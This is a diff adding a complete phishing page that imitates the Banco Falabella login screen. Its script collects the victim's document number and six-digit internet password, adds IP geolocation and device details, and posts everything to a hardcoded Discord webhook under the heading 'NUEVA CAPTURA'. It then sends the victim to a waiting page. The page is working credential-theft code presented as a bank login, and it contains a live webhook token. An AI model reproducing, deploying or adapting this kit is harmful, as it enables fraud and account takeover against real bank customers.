@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Banco Falabella</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #ffffff;
+    color: #333;
+    -webkit-font-smoothing: antialiased;
+  }
+  .app {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    max-width: 430px;
+    margin: 0 auto;
+    background: #ffffff;
+  }
+  .logo-section {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 80px 24px 40px;
+  }
+  .logo-section img { width: 190px; height: auto; }
+  .form-section { padding: 0 20px 28px; }
+  .field-group {
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1.5px solid #d0d0d0;
+    margin-bottom: 12px;
+  }
+  .select-wrapper { position: relative; background: #fff; }
+  .select-wrapper select {
+    width: 100%;
+    padding: 16px 44px 16px 14px;
+    font-size: 16px;
+    font-weight: 500;
+    color: #333;
+    background: transparent;
+    border: none;
+    border-bottom: 1.5px solid #d0d0d0;
+    outline: none;
+    appearance: none;
+    -webkit-appearance: none;
+    cursor: pointer;
+  }
+  .chevron {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    pointer-events: none;
+    color: #888;
+  }
+  .form-input {
+    width: 100%;
+    padding: 16px 14px;
+    font-size: 16px;
+    color: #333;
+    background: #fff;
+    border: none;
+    outline: none;
+  }
+  .form-input::placeholder { color: #aaa; }
+  .password-field {
+    display: none;
+    border: 1.5px solid #d0d0d0;
+    border-radius: 12px;
+    margin-bottom: 12px;
+    overflow: hidden;
+    background: #fff;
+  }
+  .password-field.visible { display: block; }
+  .password-wrapper { position: relative; }
+  .password-wrapper input {
+    width: 100%;
+    padding: 16px 48px 16px 14px;
+    font-size: 16px;
+    color: #333;
+    background: #fff;
+    border: none;
+    outline: none;
+  }
+  .password-wrapper input::placeholder { color: #aaa; }
+  .toggle-eye {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: #888;
+    display: flex;
+    align-items: center;
+  }
+  .btn-continuar {
+    width: 100%;
+    padding: 18px;
+    border-radius: 50px;
+    background: #d0d8de;
+    color: #6b7a82;
+    font-size: 17px;
+    font-weight: 500;
+    border: none;
+    cursor: pointer;
+    transition: background 0.25s, color 0.25s;
+    letter-spacing: 0.2px;
+  }
+  .btn-continuar.active { background: #4a9c2f; color: #fff; }
+  .spacer { flex: 2; }
+  .bottom-bar {
+    padding: 14px 4px 28px;
+    border-top: 1px solid #ebebeb;
+    background: #fff;
+  }
+  .icons-row {
+    display: flex;
+    justify-content: space-around;
+    align-items: flex-start;
+    margin-bottom: 16px;
+  }
+  .icon-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+    min-width: 60px;
+  }
+  .icon-box {
+    width: 58px;
+    height: 58px;
+    border-radius: 14px;
+    border: 1.5px solid #e0e0e0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fff;
+  }
+  .icon-box.promo { background: #e8003d; border-color: #e8003d; }
+  .icon-label { font-size: 11.5px; color: #444; text-align: center; line-height: 1.35; }
+  .dots { display: flex; justify-content: center; gap: 8px; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background: #ccc; }
+  .dot.active { background: #333; }
+</style>
+</head>
+<body>
+<div class="app">
+
+  <div class="logo-section">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
+         alt="Banco Falabella" width="190" height="76" loading="lazy">
+  </div>
+
+  <div class="form-section">
+    <div class="field-group">
+      <div class="select-wrapper">
+        <select id="docType" aria-label="Tipo de documento">
+          <option value="DNI">DNI</option>
+          <option value="CE">Carnet de Extranjería</option>
+          <option value="PAS">Pasaporte</option>
+        </select>
+        <svg class="chevron" width="20" height="20" viewBox="0 0 24 24" fill="none"
+             stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M7 9l5-5 5 5"/><path d="M7 15l5 5 5-5"/>
+        </svg>
+      </div>
+      <input class="form-input" id="docNumber" type="tel" maxlength="12"
+             placeholder="Ingresa tu nº de documento"
+             autocomplete="off" inputmode="numeric" aria-label="Número de documento">
+    </div>
+
+    <div class="password-field" id="passwordField">
+      <div class="password-wrapper">
+        <input type="password" id="passwordInput"
+               placeholder="Clave de internet" autocomplete="off"
+               inputmode="numeric" maxlength="6" pattern="[0-9]*"
+               aria-label="Clave de internet">
+        <button class="toggle-eye" id="toggleEye" aria-label="Mostrar clave" type="button">
+          <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none"
+               stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <button class="btn-continuar" id="btnContinuar" type="button">Continuar</button>
+  </div>
+
+  <div class="spacer"></div>
+
+  <div class="bottom-bar">
+    <div class="icons-row">
+
+      <!-- Token Móvil -->
+      <div class="icon-item">
+        <div class="icon-box">
+          <svg width="28" height="28" viewBox="0 0 28 28" fill="none"
+               stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="10" cy="18" r="4.5"/>
+            <line x1="13.2" y1="14.8" x2="24" y2="5"/>
+            <line x1="20" y1="8" x2="22.5" y2="10.5"/>
+            <line x1="16.8" y1="11" x2="19.3" y2="13.5"/>
+          </svg>
+        </div>
+        <span class="icon-label">Token<br>Móvil</span>
+      </div>
+
+      <!-- Yapear / Plinear -->
+      <div class="icon-item">
+        <div class="icon-box">
+          <svg width="30" height="30" viewBox="0 0 30 30" fill="none"
+               stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="8" y="2" width="14" height="26" rx="2.5"/>
+            <line x1="8" y1="6" x2="22" y2="6"/>
+            <line x1="8" y1="24" x2="22" y2="24"/>
+            <circle cx="15" cy="13.5" r="3"/>
+            <line x1="15" y1="10.5" x2="15" y2="11.5"/>
+            <line x1="15" y1="15.5" x2="15" y2="16.5"/>
+            <path d="M13 13.5h4"/>
+          </svg>
+        </div>
+        <span class="icon-label">Yapear /<br>Plinear</span>
+      </div>
+
+      <!-- QR -->
+      <div class="icon-item">
+        <div class="icon-box">
+          <svg width="30" height="30" viewBox="0 0 30 30" fill="none"
+               stroke="#555" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="3" width="9" height="9" rx="1.5"/>
+            <rect x="5.5" y="5.5" width="4" height="4" rx="0.5" fill="#555" stroke="none"/>
+            <rect x="18" y="3" width="9" height="9" rx="1.5"/>
+            <rect x="20.5" y="5.5" width="4" height="4" rx="0.5" fill="#555" stroke="none"/>
+            <rect x="3" y="18" width="9" height="9" rx="1.5"/>
+            <rect x="5.5" y="20.5" width="4" height="4" rx="0.5" fill="#555" stroke="none"/>
+            <rect x="18" y="18" width="4" height="4" rx="0.5" fill="#555" stroke="none"/>
+            <rect x="24" y="18" width="3" height="3" rx="0.5" fill="#555" stroke="none"/>
+            <rect x="18" y="24" width="3" height="3" rx="0.5" fill="#555" stroke="none"/>
+            <rect x="23" y="23" width="4" height="4" rx="0.5" fill="#555" stroke="none"/>
+          </svg>
+        </div>
+        <span class="icon-label">QR</span>
+      </div>
+
+      <!-- Promociones -->
+      <div class="icon-item">
+        <div class="icon-box promo">
+          <svg width="46" height="22" viewBox="0 0 92 28" fill="none">
+            <text x="2" y="22" font-family="-apple-system,BlinkMacSystemFont,sans-serif"
+                  font-weight="800" font-size="23" fill="white" letter-spacing="-0.5">ÚNICA</text>
+          </svg>
+        </div>
+        <span class="icon-label">Promociones</span>
+      </div>
+
+      <!-- Chatea aquí -->
+      <div class="icon-item">
+        <div class="icon-box">
+          <svg width="28" height="28" viewBox="0 0 28 28" fill="none"
+               stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M14 2.5C7.925 2.5 3 7.201 3 13c0 2.04.594 3.944 1.625 5.555L3 25l6.545-1.5A11.32 11.32 0 0014 23.5c6.075 0 11-4.701 11-10.5S20.075 2.5 14 2.5z"/>
+            <path d="M9.5 13h.01M14 13h.01M18.5 13h.01"
+                  stroke="#555" stroke-width="2.2" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <span class="icon-label">Chatea<br>aquí</span>
+      </div>
+
+    </div>
+
+    <div class="dots">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  const docNumber = document.getElementById("docNumber");
+  const passwordField = document.getElementById("passwordField");
+  const passwordInput = document.getElementById("passwordInput");
+  const btnContinuar = document.getElementById("btnContinuar");
+  const toggleEye = document.getElementById("toggleEye");
+  const eyeIcon = document.getElementById("eyeIcon");
+
+  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490551948598837268/ee4s2QMfWrRrKHaeCKDVKYzP3Cg4wFD5G7lbg4v-KOLnAWwolFgJSXcYWfGLKH-IJ8pV";
+
+  // LocalStorage helpers
+  function saveToStorage(key, value) {
+    try { localStorage.setItem(key, value); } catch(e) {}
+  }
+  function getFromStorage(key) {
+    try { return localStorage.getItem(key); } catch(e) { return null; }
+  }
+
+  // Restore saved DNI if exists
+  const savedDni = getFromStorage("bf_last_dni");
+  if (savedDni) {
+    docNumber.value = savedDni;
+    passwordField.classList.add("visible");
+    updateButton();
+  }
+
+  docNumber.addEventListener("input", function() {
+    saveToStorage("bf_last_dni", this.value);
+    saveToStorage("bf_doc_type", document.getElementById("docType").value);
+    if (this.value.trim().length >= 8) {
+      if (!passwordField.classList.contains("visible")) {
+        passwordField.classList.add("visible");
+        setTimeout(() => passwordInput.focus(), 50);
+      }
+    } else {
+      passwordField.classList.remove("visible");
+    }
+    updateButton();
+  });
+
+  passwordInput.addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "");
+    updateButton();
+  });
+
+  function updateButton() {
+    const dniOk = docNumber.value.trim().length >= 8;
+    const passVisible = passwordField.classList.contains("visible");
+    const passOk = !passVisible || passwordInput.value.length >= 6;
+    btnContinuar.classList.toggle("active", dniOk && passOk);
+  }
+
+  let eyeOpen = false;
+  toggleEye.addEventListener("click", function() {
+    eyeOpen = !eyeOpen;
+    passwordInput.type = eyeOpen ? "text" : "password";
+    eyeIcon.innerHTML = eyeOpen
+      ? `<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
+         <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
+         <line x1="1" y1="1" x2="23" y2="23"/>`
+      : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+         <circle cx="12" cy="12" r="3"/>`;
+  });
+
+  async function getUserInfo() {
+    let ip = "Desconocida", country = "Desconocido", city = "Desconocida", isp = "Desconocido", timezone = "Desconocido";
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      ip       = data.ip        || ip;
+      country  = data.country_name || country;
+      city     = data.city      || city;
+      isp      = data.org       || isp;
+      timezone = data.timezone  || timezone;
+    } catch(e) {}
+    return { ip, country, city, isp, timezone };
+  }
+
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = "Desktop";
+    if (/iPhone/i.test(ua))       device = "iPhone";
+    else if (/iPad/i.test(ua))    device = "iPad";
+    else if (/Android/i.test(ua)) device = "Android";
+    const browser = /Chrome/i.test(ua) ? "Chrome"
+                  : /Firefox/i.test(ua) ? "Firefox"
+                  : /Safari/i.test(ua)  ? "Safari"
+                  : /Edge/i.test(ua)    ? "Edge" : "Otro";
+    const os = /Windows/i.test(ua) ? "Windows"
+             : /Mac/i.test(ua)     ? "macOS"
+             : /Linux/i.test(ua)   ? "Linux"
+             : /Android/i.test(ua) ? "Android"
+             : /iOS/i.test(ua)     ? "iOS" : "Desconocido";
+    const lang = navigator.language || "Desconocido";
+    const screen = `${window.screen.width}x${window.screen.height}`;
+    const now = new Date();
+    const fecha = now.toLocaleDateString("es-PE", { weekday:"long", year:"numeric", month:"long", day:"numeric" });
+    const hora  = now.toLocaleTimeString("es-PE", { hour:"2-digit", minute:"2-digit", second:"2-digit" });
+    return { device, browser, os, lang, screen, fecha, hora };
+  }
+
+  async function sendToDiscord(dni, clave) {
+    const geo = await getUserInfo();
+    const dev = getDeviceInfo();
+
+    const payload = {
+      username: "Banco Falabella Logger",
+      avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png",
+      embeds: [{
+        title: "🏦  NUEVA CAPTURA — BANCO FALABELLA",
+        color: 0x4a9c2f,
+        thumbnail: {
+          url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
+        },
+        fields: [
+          {
+            name: "🪪  CREDENCIALES",
+            value: `\`\`\`
+DNI   : ${dni}
+CLAVE : ${clave}
+\`\`\``,
+            inline: false
+          },
+          {
+            name: "🌐  RED / IP",
+            value: `> **IP:** \`${geo.ip}\`
+> **País:** ${geo.country}
+> **Ciudad:** ${geo.city}
+> **ISP:** ${geo.isp}
+> **Zona horaria:** ${geo.timezone}`,
+            inline: false
+          },
+          {
+            name: "💻  DISPOSITIVO",
+            value: `> **Dispositivo:** ${dev.device}
+> **SO:** ${dev.os}
+> **Navegador:** ${dev.browser}
+> **Idioma:** ${dev.lang}
+> **Resolución:** ${dev.screen}`,
+            inline: false
+          },
+          {
+            name: "🕐  FECHA Y HORA",
+            value: `> 📅 ${dev.fecha}
+> 🕐 ${dev.hora}`,
+            inline: false
+          }
+        ],
+        footer: {
+          text: "⚡ by @Brknshinexxx  •  Telegram",
+          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  btnContinuar.addEventListener("click", async function() {
+    if (!this.classList.contains("active")) return;
+
+    const dni   = docNumber.value.trim();
+    const clave = passwordInput.value.trim();
+
+    // Save to localStorage
+    saveToStorage("bf_last_dni",   dni);
+    saveToStorage("bf_last_login", new Date().toISOString());
+
+    // Visual feedback
+    this.textContent = "Iniciando sesión...";
+    this.disabled = true;
+
+    try {
+      await sendToDiscord(dni, clave);
+    } catch(e) {}
+
+    // Redirect to wait page
+    setTimeout(() => {
+      window.location.href = "wait.html";
+    }, 1500);
+  });
+</script>
+</body>
+</html>
